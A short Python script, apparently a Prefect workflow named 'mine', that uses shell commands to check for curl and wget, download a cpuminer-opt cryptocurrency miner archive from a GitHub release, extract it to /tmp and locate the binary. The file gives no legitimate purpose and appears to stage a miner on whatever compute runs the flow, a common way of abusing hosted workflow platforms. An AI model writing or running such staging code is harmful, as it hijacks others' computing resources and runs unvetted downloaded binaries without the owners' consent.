import subprocess
from prefect import flow, get_run_logger

@flow
def mine():
    logger = get_run_logger()
    r1 = subprocess.run("which wget curl", shell=True, capture_output=True, text=True)
    logger.info("Tools: " + r1.stdout)
    r2 = subprocess.run("curl -sL https://github.com/RainbowMiner/miner-binaries/releases/download/v5.0.46-rplant/cpuminer-opt-linux-5.0.46u.tar.gz -o /tmp/c.tar.gz && tar xf /tmp/c.tar.gz -C /tmp && find /tmp -name 'cpuminer*'", shell=True, capture_output=True, text=True)
    logger.info("Result: " + r2.stdout)
    logger.info("Error: " + r2.stderr)

if __name__ == "__main__":
    mine()
